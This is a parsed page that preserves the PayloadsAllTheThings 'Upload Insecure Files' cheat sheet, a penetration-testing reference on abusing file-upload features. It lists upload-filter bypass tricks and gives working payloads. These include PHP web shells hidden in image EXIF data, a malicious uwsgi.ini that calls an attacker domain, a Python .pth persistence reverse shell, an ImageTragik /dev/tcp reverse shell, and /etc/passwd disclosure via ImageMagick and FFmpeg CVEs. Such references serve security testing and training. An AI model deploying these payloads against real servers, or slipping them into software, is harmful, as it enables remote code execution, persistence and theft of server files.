---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# Upload Insecure Files

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-upload-insecure-files-readme` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Upload Insecure Files/README.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Upload Insecure Files](../../topics/upload-insecure-files/upload-insecure-files.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-upload-insecure-files-readme |
| name | Upload Insecure Files |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md |

## Preserved Source Material

````yaml
_body: "# Upload Insecure Files\n\n> Uploaded files may pose a significant risk if not handled correctly. A remote attacker\
  \ could send a multipart/form-data POST request with a specially-crafted filename or mime type and execute arbitrary code.\n\
  \n## Summary\n\n* [Tools](#tools)\n* [Methodology](#methodology)\n    * [Defaults Extensions](#defaults-extensions)\n  \
  \  * [Upload Tricks](#upload-tricks)\n    * [Filename Vulnerabilities](#filename-vulnerabilities)\n    * [Picture Compression](#picture-compression)\n\
  \    * [Picture Metadata](#picture-metadata)\n    * [Configuration Files](#configuration-files)\n    * [CVE - ImageMagick](#cve---imagemagick)\n\
  \    * [CVE - FFMpeg HLS](#cve---ffmpeg-hls)\n* [Labs](#labs)\n* [References](#references)\n\n## Tools\n\n* [almandin/fuxploiderFuxploider](https://github.com/almandin/fuxploider)\
  \ - File upload vulnerability scanner and exploitation tool.\n* [Burp/Upload Scanner](https://portswigger.net/bappstore/b2244cbb6953442cb3c82fa0a0d908fa)\
  \ -  HTTP file upload scanner for Burp Proxy.\n* [ZAP/FileUpload](https://www.zaproxy.org/blog/2021-08-20-zap-fileupload-addon/)\
  \ -  OWASP ZAP add-on for finding vulnerabilities in File Upload functionality.\n\n## Methodology\n\n![file-upload-mindmap.png](https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/Upload%20Insecure%20Files/Images/file-upload-mindmap.png?raw=true)\n\
  \n### Defaults Extensions\n\nHere is a list of the default extensions for web shell pages in the selected languages (PHP,\
  \ ASP, JSP).\n\n* PHP Server\n\n    ```powershell\n    .php\n    .php3\n    .php4\n    .php5\n    .php7\n\n    # Less known\
  \ PHP extensions\n    .pht\n    .phps\n    .phar\n    .phpt\n    .pgif\n    .phtml\n    .phtm\n    .inc\n    ```\n\n* ASP\
  \ Server\n\n    ```powershell\n    .asp\n    .aspx\n    .config\n    .cer # (IIS <= 7.5)\n    .asa # (IIS <= 7.5)\n    shell.aspx;1.jpg\
  \ # (IIS < 7.0)\n    shell.soap\n    ```\n\n* JSP : `.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .actions`\n* Perl: `.pl,\
  \ .pm, .cgi, .lib`\n* Coldfusion: `.cfm, .cfml, .cfc, .dbm`\n* Node.js: `.js, .json, .node`\n\nOther extensions that can\
  \ be abused to trigger other vulnerabilities.\n\n* `.svg`: XXE, XSS, SSRF\n* `.gif`: XSS\n* `.csv`: CSV Injection\n* `.xml`:\
  \ XXE\n* `.avi`: LFI, SSRF\n* `.js` : XSS, Open Redirect\n* `.zip`: RCE, DOS, LFI Gadget\n* `.html` : XSS, Open Redirect\n\
  \n### Upload Tricks\n\n**Extensions**:\n\n* Use double extensions : `.jpg.php, .png.php5`\n* Use reverse double extension\
  \ (useful to exploit Apache misconfigurations where anything with extension .php, but not necessarily ending in .php will\
  \ execute code): `.php.jpg`\n* Random uppercase and lowercase : `.pHp, .pHP5, .PhAr`\n* Null byte (works well against `pathinfo()`)\n\
  \    * `.php%00.gif`\n    * `.php\\x00.gif`\n    * `.php%00.png`\n    * `.php\\x00.png`\n    * `.php%00.jpg`\n    * `.php\\\
  x00.jpg`\n* Special characters\n    * Multiple dots : `file.php......` , on Windows when a file is created with dots at\
  \ the end those will be removed.\n    * Whitespace and new line characters\n        * `file.php%20`\n        * `file.php%0d%0a.jpg`\n\
  \        * `file.php%0a`\n    * Right to Left Override (RTLO): `name.%E2%80%AEphp.jpg` will became `name.gpj.php`.\n   \
  \ * Slash: `file.php/`, `file.php.\\`, `file.j\\sp`, `file.j/sp`\n    * Multiple special characters: `file.jsp/././././.`\n\
  \    * UTF8 filename: `Content-Disposition: form-data; name=\"anyBodyParam\"; filename*=UTF8''myfile%0a.txt`\n\n* On Windows\
  \ OS, `include`, `require` and `require_once` functions will convert \"foo.php\" followed by one or more of the chars `\\\
  x20` ( ), `\\x22` (\"), `\\x2E` (.), `\\x3C` (<), `\\x3E` (>) back to \"foo.php\".\n* On Windows OS, `fopen` function will\
  \ convert \"foo.php\" followed by one or more of the chars `\\x2E` (.), `\\x2F` (/), `\\x5C` (\\) back to \"foo.php\".\n\
  * On Windows OS, `move_uploaded_file` function will convert \"foo.php\" followed by one or more of the chars `\\x2E` (.),\
  \ `\\x2F` (/), `\\x5C` (\\) back to \"foo.php\".\n\n* On Windows OS, when running PHP on IIS some characters are automatically\
  \ converted to other characters when it is going to save a file (e.g. `web<<` becomes `web**` and can replace `web.config`).\n\
  \    * `\\x3E` (>) is converted to `\\x3F` (?)\n    * `\\x3C` (<) is converted to `\\x2A` (*)\n    * `\\x22` (\") is converted\
  \ to `\\x2E` (.), to use this trick in a file upload request the \"`Content-Disposition`\" header should use single quotes\
  \ (e.g. filename='web\"config').\n\n**File Identification**:\n\nMIME type, a MIME type (Multipurpose Internet Mail Extensions\
  \ type) is a standardized identifier that tells browsers, servers, and applications what kind of file or data is being handled.\
  \ It consists of a type and a subtype, separated by a slash. Change `Content-Type : application/x-php` or `Content-Type\
  \ : application/octet-stream` to `Content-Type : image/gif` to disguise the content as an image.\n\n* Common images content-types:\n\
  \n    ```cs\n    Content-Type: image/gif\n    Content-Type: image/png\n    Content-Type: image/jpeg\n    ```\n\n* Content-Type\
  \ wordlist: [SecLists/web-all-content-types.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt)\n\
  \n    ```cs\n    text/php\n    text/x-php\n    application/php\n    application/x-php\n    application/x-httpd-php\n   \
  \ application/x-httpd-php-source\n    ```\n\n* Set the `Content-Type` twice, once for unallowed type and once for allowed.\n\
  \n[Magic Bytes](https://en.wikipedia.org/wiki/List_of_file_signatures) - Sometimes applications identify file types based\
  \ on their first signature bytes. Adding/replacing them in a file might trick the application.\n\n* PNG: `\\x89PNG\\r\\\
  n\\x1a\\n\\0\\0\\0\\rIHDR\\0\\0\\x03H\\0\\xs0\\x03[`\n* JPG: `\\xff\\xd8\\xff`\n* GIF: `GIF87a` OR `GIF8;`\n\n**File Encapsulation**:\n\
  \nUsing NTFS alternate data stream (ADS) in Windows.\nIn this case, a colon character \":\" will be inserted after a forbidden\
  \ extension and before a permitted one. As a result, an empty file with the forbidden extension will be created on the server\
  \ (e.g. \"`file.asax:.jpg`\"). This file might be edited later using other techniques such as using its short filename.\
  \ The \"::$data\" pattern can also be used to create non-empty files. Therefore, adding a dot character after this pattern\
  \ might also be useful to bypass further restrictions (.e.g. \"`file.asp::$data.`\")\n\n**Other Techniques**:\n\nPHP web\
  \ shells don't always have the `<?php` tag, here are some alternatives:\n\n* Using a PHP script tag `<script language=\"\
  php\">`\n\n    ```html\n    <script language=\"php\">system(\"id\");</script>\n    ```\n\n* The `<?=` is shorthand syntax\
  \ in PHP for outputting values. It is equivalent to using `<?php echo`.\n\n    ```php\n    <?=`id`?>\n    ```\n\n### Filename\
  \ Vulnerabilities\n\nSometimes the vulnerability is not the upload but how the file is handled after. You might want to\
  \ upload files with payloads in the filename.\n\n* Time-Based SQLi Payloads: e.g. `poc.js'(select*from(select(sleep(20)))a)+'.extension`\n\
  * LFI/Path Traversal Payloads:  e.g. `image.png../../../../../../../etc/passwd`\n* XSS Payloads e.g. `'\"><img src=x onerror=alert(document.domain)>.extension`\n\
  * File Traversal e.g. `../../../tmp/lol.png`\n* Command Injection e.g. `; sleep 10;`\n\nAlso you upload:\n\n* HTML/SVG files\
  \ to trigger an XSS\n* EICAR file to check the presence of an antivirus\n\n### Picture Compression\n\nCreate valid pictures\
  \ hosting PHP code. Upload the picture and use a **Local File Inclusion** to execute the code. The shell can be called with\
  \ the following command : `curl 'http://localhost/test.php?0=system' --data \"1='ls'\"`.\n\n* Picture Metadata, hide the\
  \ payload inside a comment tag in the metadata.\n* Picture Resize, hide the payload within the compression algorithm in\
  \ order to bypass a resize. Also defeating `getimagesize()` and `imagecreatefromgif()`.\n    * [JPG](https://virtualabs.fr/Nasty-bulletproof-Jpegs-l):\
  \ use createBulletproofJPG.py\n    * [PNG](https://blog.isec.pl/injection-points-in-popular-image-formats/): use createPNGwithPLTE.php\n\
  \    * [GIF](https://blog.isec.pl/injection-points-in-popular-image-formats/): use createGIFwithGlobalColorTable.php\n\n\
  ### Picture Metadata\n\nCreate a custom picture and insert exif tag with `exiftool`. A list of multiple exif tags can be\
  \ found at [exiv2.org](https://exiv2.org/tags.html)\n\n```ps1\nconvert -size 110x110 xc:white payload.jpg\nexiftool -Copyright=\"\
  PayloadsAllTheThings\" -Artist=\"Pentest\" -ImageUniqueID=\"Example\" payload.jpg\nexiftool -Comment=\"<?php echo 'Command:';\
  \ if($_POST){system($_POST['cmd']);} __halt_compiler();\" img.jpg\n```\n\n### Configuration Files\n\nIf you are trying to\
  \ upload files to a :\n\n* PHP server, take a look at the [.htaccess](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess)\
  \ trick to execute code.\n* ASP server, take a look at the [web.config](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config)\
  \ trick to execute code.\n* uWSGI server, take a look at the [uwsgi.ini](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20uwsgi.ini/uwsgi.ini)\
  \ trick to execute code.\n\nConfiguration files examples\n\n* [Apache: .htaccess](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess)\n\
  * [IIS: web.config](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config)\n\
  * [Python: \\_\\_init\\_\\_.py](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Python%20__init__.py)\n\
  * [WSGI: uwsgi.ini](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20uwsgi.ini/uwsgi.ini)\n\
  \n#### Apache: .htaccess\n\nThe `AddType` directive in an `.htaccess` file is used to specify the MIME (Multipurpose Internet\
  \ Mail Extensions) type for different file extensions on an Apache HTTP Server. This directive helps the server understand\
  \ how to handle different types of files and what content type to associate with them when serving them to clients (such\
  \ as web browsers).  \n\nHere is the basic syntax of the AddType directive:\n\n```ps1\nAddType mime-type extension [extension\
  \ ...]\n```\n\nExploit `AddType` directive by uploading an .htaccess file with the following content.\n\n```ps1\nAddType\
  \ application/x-httpd-php .rce\n```\n\nThen upload any file with `.rce` extension.\n\n#### WSGI: uwsgi.ini\n\nuWSGI configuration\
  \ files can include “magic” variables, placeholders and operators defined with a precise syntax. The ‘@’ operator in particular\
  \ is used in the form of @(filename) to include the contents of a file. Many uWSGI schemes are supported, including “exec”\
  \ - useful to read from a process’s standard output. These operators can be weaponized for Remote Command Execution or Arbitrary\
  \ File Write/Read when a .ini configuration file is parsed:\n\nExample of a malicious `uwsgi.ini` file:\n\n```ini\n[uwsgi]\n\
  ; read from a symbol\nfoo = @(sym://uwsgi_funny_function)\n; read from binary appended data\nbar = @(data://[ATTACKER.DOMAIN.TLD])\n\
  ; read from http\ntest = @(http://[ATTACKER.DOMAIN.TLD])\n; read from a file descriptor\ncontent = @(fd://[ATTACKER.DOMAIN.TLD])\n\
  ; read from a process stdout\nbody = @(exec://whoami)\n; call a function returning a char *\ncharacters = @(call://uwsgi_func)\n\
  ```\n\nWhen the configuration file will be parsed (e.g. restart, crash or autoreload) payload will be executed.\n\n####\
  \ Dependency Manager\n\nAlternatively you may be able to upload a JSON file with a custom scripts, try to overwrite a dependency\
  \ manager configuration file.\n\n* package.json\n\n    ```js\n    \"scripts\": {\n        \"prepare\" : \"/bin/touch /tmp/pwned.txt\"\
  \n    }\n    ```\n\n* composer.json\n\n    ```js\n    \"scripts\": {\n        \"pre-command-run\" : [\n        \"/bin/touch\
  \ /tmp/pwned.txt\"\n        ]\n    }\n    ```\n\n#### Python Path File\n\nWhen a `.pth` file is placed in a directory like\
  \ `site-packages` or `dist-packages`, Python's `site` initialization logic processes it during interpreter startup.\n\n\
  > An executable line in a .pth file is run at every Python startup, regardless of whether a particular module is actually\
  \ going to be used. - [Site-specific configuration hook](https://docs.python.org/3/library/site.html)\n\nDropping a malicious\
  \ `.pth` file into a globally loaded package directory can give an attacker repeated code execution without modifying the\
  \ target application's source code. Any Python program that starts in that environment may trigger the payload.\n\nDefault\
  \ locations for globally loaded package directories can be extracted using `python3 -m site`. Typical locations include:\n\
  \n```py\n/usr/lib/pythonX.Y/site-packages/\n/usr/local/lib/pythonX.Y/dist-packages/\n\n# home location\n/root\n/home/$USER\n\
  ```\n\nExample of malicious use, this will create a reverse shell that will connect back to the attacker's machine every\
  \ time a Python process starts in that environment.:\n\n```bash\necho 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"\
  10.10.10.10\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")' > /usr/local/lib/python3.6/site-packages/persistence.pth\n\
  ```\n\n### CVE - ImageMagick\n\nIf the backend is using ImageMagick to resize/convert user images, you can try to exploit\
  \ well-known vulnerabilities such as ImageTragik.\n\n#### CVE-2016–3714 - ImageTragik\n\nUpload this content with an image\
  \ extension to exploit the vulnerability (ImageMagick , 7.0.1-1)\n\n* ImageTragik - example #1\n\n    ```powershell\n  \
  \  push graphic-context\n    viewbox 0 0 640 480\n    fill 'url(https://127.0.0.1/test.jpg\"|bash -i >& /dev/tcp/attacker-ip/attacker-port\
  \ 0>&1|touch \"hello)'\n    pop graphic-context\n    ```\n\n* ImageTragik - example #3\n\n    ```powershell\n    %!PS\n\
  \    userdict /setpagedevice undef\n    save\n    legal\n    { null restore } stopped { pop } if\n    { legal } stopped\
  \ { pop } if\n    restore\n    mark /OutputFile (%pipe%id) currentdevice putdeviceprops\n    ```\n\nThe vulnerability can\
  \ be triggered by using the `convert` command.\n\n```ps1\nconvert shellexec.jpeg whatever.gif\n```\n\n#### CVE-2022-44268\n\
  \nCVE-2022-44268 is an information disclosure vulnerability identified in ImageMagick. An attacker can exploit this by crafting\
  \ a malicious image file that, when processed by ImageMagick, can disclose information from the local filesystem of the\
  \ server running the vulnerable version of the software.\n\n* Generate the payload\n\n    ```ps1\n    apt-get install pngcrush\
  \ imagemagick exiftool exiv2 -y\n    pngcrush -text a \"profile\" \"/etc/passwd\" exploit.png\n    ```\n\n* Trigger the\
  \ exploit by uploading the file. The backend might use something like `convert pngout.png pngconverted.png`\n* Download\
  \ the converted picture and inspect its content with: `identify -verbose pngconverted.png`\n* Convert the exfiltrated data:\
  \ `python3 -c 'print(bytes.fromhex(\"HEX_FROM_FILE\").decode(\"utf-8\"))'`\n\nMore payloads in the folder `Picture ImageMagick/`.\n\
  \n### CVE - FFMpeg HLS\n\nFFmpeg is an open source software used for processing audio and video formats. You can use a malicious\
  \ HLS playlist inside an AVI video to read arbitrary files.\n\n1. `./gen_xbin_avi.py file://<filename> file_read.avi`\n\
  2. Upload `file_read.avi` to some website that processes videofiles\n3. On server side, done by the videoservice: `ffmpeg\
  \ -i file_read.avi output.mp4`\n4. Click \"Play\" in the videoservice.\n5. If you are lucky, you'll the content of `<filename>`\
  \ from the server.\n\nThe script creates an AVI that contains an HLS playlist inside GAB2. The playlist generated by this\
  \ script looks like this:\n\n```ps1\n#EXTM3U\n#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:1.0\nGOD.txt\n#EXTINF:1.0\n/etc/passwd\n\
  #EXT-X-ENDLIST\n```\n\nMore payloads in the folder `CVE FFmpeg HLS/`.\n\n## Labs\n\n* [PortSwigger - Labs on File Uploads](https://portswigger.net/web-security/all-labs#file-upload-vulnerabilities)\n\
  * [Root Me - File upload - Double extensions](https://www.root-me.org/en/Challenges/Web-Server/File-upload-Double-extensions)\n\
  * [Root Me - File upload - MIME type](https://www.root-me.org/en/Challenges/Web-Server/File-upload-MIME-type)\n* [Root Me\
  \ - File upload - Null byte](https://www.root-me.org/en/Challenges/Web-Server/File-upload-Null-byte)\n* [Root Me - File\
  \ upload - ZIP](https://www.root-me.org/en/Challenges/Web-Server/File-upload-ZIP)\n* [Root Me - File upload - Polyglot](https://www.root-me.org/en/Challenges/Web-Server/File-upload-Polyglot)\n\
  \n## References\n\n* [A New Vector For “Dirty” Arbitrary File Write to RCE - Maxence Schmitt and Lorenzo Stella - February\
  \ 28, 2023](https://web.archive.org/web/20230228140105/https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)\n\
  * [Analysis of Python's .pth files as a persistence mechanism - @malmoeb - January 14, 2025](https://web.archive.org/web/20250218083206/https://dfir.ch/posts/publish_python_pth_extension/)\n\
  * [Arbitrary File Upload Tricks In Java - pyn3rd - May 7, 2022](https://web.archive.org/web/20220601101409/https://pyn3rd.github.io/2022/05/07/Arbitrary-File-Upload-Tricks-In-Java/)\n\
  * [Attacking Webservers Via .htaccess - Eldar Marcussen - May 17, 2011](https://web.archive.org/web/20200203171034/https://www.justanotherhacker.com:80/2011/05/htaccess-based-attacks.html)\n\
  * [BookFresh Tricky File Upload Bypass to RCE - Ahmed Aboul-Ela - November 29, 2014](http://web.archive.org/web/20141231210005/https://secgeek.net/bookfresh-vulnerability/)\n\
  * [Bulletproof Jpegs Generator - Damien Cauquil (@virtualabs) - April 9, 2012](https://web.archive.org/web/20130606125954/http://www.virtualabs.fr/Nasty-bulletproof-Jpegs-l)\n\
  * [Encoding Web Shells in PNG IDAT chunks - phil - April 6, 2012](https://web.archive.org/web/20120610205435/http://www.idontplaydarts.com:80/2012/06/encoding-web-shells-in-png-idat-chunks)\n\
  * [File Upload - HackTricks - July 20, 2024](https://web.archive.org/web/20241230150546/https://book.hacktricks.xyz/pentesting-web/file-upload)\n\
  * [File Upload and PHP on IIS: >=? and <=* and \"=. - Soroush Dalili (@irsdl) - July 23, 2014](https://web.archive.org/web/20231003035528/https://soroush.me/blog/2014/07/file-upload-and-php-on-iis-wildcards/)\n\
  * [File Upload restrictions bypass - Haboob Team - July 24, 2018](https://web.archive.org/web/20180724174319/https://www.exploit-db.com/docs/english/45074-file-upload-restrictions-bypass.pdf)\n\
  * [IIS - SOAP - Navigating The Shadows - 0xbad53c - May 19, 2024](https://web.archive.org/web/20220404084558/https://red.0xbad53c.com/red-team-operations/initial-access/webshells/iis-soap)\n\
  * [Injection points in popular image formats - Daniel Kalinowski‌‌ - November 8, 2019](https://web.archive.org/web/20191130061135/https://blog.isec.pl/injection-points-in-popular-image-formats/)\n\
  * [Insomnihack Teaser 2019 / l33t-hoster - Ian Bouchard (@Corb3nik) - January 20, 2019](https://web.archive.org/web/20190125123231/http://corb3nik.github.io:80/blog/insomnihack-teaser-2019/l33t-hoster)\n\
  * [Inyección de código en imágenes subidas y tratadas con PHP-GD - hackplayers - March 22, 2020](https://web.archive.org/web/20260219153035/https://www.hackplayers.com/2020/03/inyeccion-de-codigo-en-imagenes-php-gd.html)\n\
  * [La PNG qui se prenait pour du PHP - Philippe Paget (@PagetPhil) - February 23, 2014](https://web.archive.org/web/20140416083530/http://phil242.wordpress.com/2014/02/23/la-png-qui-se-prenait-pour-du-php/)\n\
  * [More Ghostscript Issues: Should we disable PS coders in policy.xml by default? - Tavis Ormandy - August 21, 2018](https://web.archive.org/web/20180821130209/http://openwall.com/lists/oss-security/2018/08/21/2)\n\
  * [PHDays - Attacks on video converters:a year later - Emil Lerner, Pavel Cheremushkin - December 20, 2017](https://docs.google.com/presentation/d/1yqWy_aE3dQNXAhW8kxMxRqtP7qMHaIfMzUDpEqFneos/edit#slide=id.p)\n\
  * [Protection from Unrestricted File Upload Vulnerability - Narendra Shinde - October 22, 2015](https://web.archive.org/web/20200812181326/https://blog.qualys.com/securitylabs/2015/10/22/unrestricted-file-upload-vulnerability)\n\
  * [The .phpt File Structure - PHP Internals Book - October 18, 2017](https://web.archive.org/web/20260218185252/https://www.phpinternalsbook.com/tests/phpt_file_structure.html)"
_relative_path: Upload Insecure Files/README.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Upload Insecure Files/README.md
````
